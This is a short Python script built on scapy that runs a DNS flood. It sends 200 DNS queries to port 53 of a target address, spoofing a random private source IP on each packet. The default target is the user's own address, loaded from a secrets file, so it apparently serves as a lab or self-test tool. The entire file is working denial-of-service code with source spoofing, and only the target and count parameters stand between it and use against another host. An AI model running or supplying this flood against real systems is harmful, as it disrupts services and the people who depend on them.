from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp
import random
from secrets_loader import MY_IP, MY_MAC, MY_IFACE

def main(target_ip=MY_IP, count=200):
    print(f"[+] Starting DNS Flood on {target_ip}:53")
    ether = Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff")
    for i in range(count):
        ip = IP(src=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}", dst=target_ip)
        udp = UDP(sport=random.randint(1024,65535), dport=53)
        dns = DNS(rd=1, qd=DNSQR(qname=f"fake{i}.example.com"))
        pkt = ether / ip / udp / dns
        sendp(pkt, iface=MY_IFACE, verbose=False)
    print("[+] DNS Flood complete")

if __name__ == "__main__":
    main()
